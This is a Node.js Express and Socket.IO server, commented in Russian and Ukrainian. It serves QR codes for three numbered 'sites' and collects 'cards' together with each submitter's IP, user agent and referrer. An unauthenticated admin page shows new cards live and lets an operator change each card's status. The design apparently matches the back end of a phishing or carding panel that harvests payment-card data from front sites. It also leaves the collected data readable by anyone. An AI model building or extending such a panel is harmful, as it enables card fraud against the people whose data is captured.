const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const socketIO = require('socket.io');
const helmet = require('helmet');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const cors = require('cors');
const compression = require('compression');
const { upload, checkQRCode, optimizeImage } = require('./qr-handler');
const { addCard, getCards, updateCardStatus, deleteCard } = require('./db');

// Настройка логирования
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(compression());
app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use(limiter);

// Роути для QR-кодів
app.get('/qr/:siteNumber', (req, res) => {
    const siteNumber = req.params.siteNumber;
    if (!['1', '2', '3'].includes(siteNumber)) {
        return res.status(400).json({ error: 'Неверный номер сайта' });
    }

    if (!checkQRCode(siteNumber)) {
        return res.status(404).json({ error: 'QR-код не найден' });
    }

    res.sendFile(path.join(__dirname, 'public/qr_codes', `сайт${siteNumber}.png`));
});

// Загрузка нового QR-кода
app.post('/admin/upload-qr', upload.single('qrCode'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'Файл не был загружен' });
        }

        const siteNumber = req.body.siteNumber;
        if (!['1', '2', '3'].includes(siteNumber)) {
            return res.status(400).json({ error: 'Неверный номер сайта' });
        }

        await optimizeImage(req.file.path);
        
        res.json({ message: 'QR-код успешно загружен' });
    } catch (error) {
        logger.error('Ошибка загрузки QR-кода:', error);
        res.status(500).json({ error: 'Ошибка при загрузке QR-кода' });
    }
});

// API роути для роботи з картками
app.post('/api/cards', async (req, res) => {
    try {
        const cardId = await addCard({
            ...req.body,
            ip: req.ip,
            ua: req.get('user-agent'),
            referrer: req.get('referrer')
        });
        res.json({ id: cardId });
    } catch (error) {
        logger.error('Error adding card:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/cards', async (req, res) => {
    try {
        const cards = await getCards();
        res.json(cards);
    } catch (error) {
        logger.error('Error getting cards:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.put('/api/cards/:id/status', async (req, res) => {
    try {
        const { id } = req.params;
        const { status } = req.body;
        await updateCardStatus(id, status);
        res.json({ message: 'Status updated' });
    } catch (error) {
        logger.error('Error updating card status:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.delete('/api/cards/:id', async (req, res) => {
    try {
        const { id } = req.params;
        await deleteCard(id);
        res.json({ message: 'Card deleted' });
    } catch (error) {
        logger.error('Error deleting card:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Маршрут для адмін-панелі
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin/index.html'));
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
const server = https.createServer({
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
}, app);

// Налаштування Socket.IO
const io = socketIO(server, {
    cors: {
        origin: "https://localhost:3000",
        methods: ["GET", "POST"],
        credentials: true
    }
});

// Обробка Socket.IO подій
io.on('connection', (socket) => {
    logger.info('New client connected');
    
    // Відправляємо всі картки при підключенні
    getCards().then(cards => {
        socket.emit('initial_cards', cards);
    });

    // Обробка нових карток
    socket.on('new_card', async (cardData) => {
        try {
            const cardId = await addCard(cardData);
            const cards = await getCards();
            io.emit('cards_update', cards);
        } catch (error) {
            logger.error('Error handling new card:', error);
        }
    });

    // Обробка зміни статусу
    socket.on('update_status', async (data) => {
        try {
            await updateCardStatus(data.id, data.status);
            const cards = await getCards();
            io.emit('cards_update', cards);
        } catch (error) {
            logger.error('Error updating status:', error);
        }
    });

    socket.on('disconnect', () => {
        logger.info('Client disconnected');
    });
});

server.listen(PORT, () => {
    logger.info(`Сервер запущен на порту ${PORT}`);
});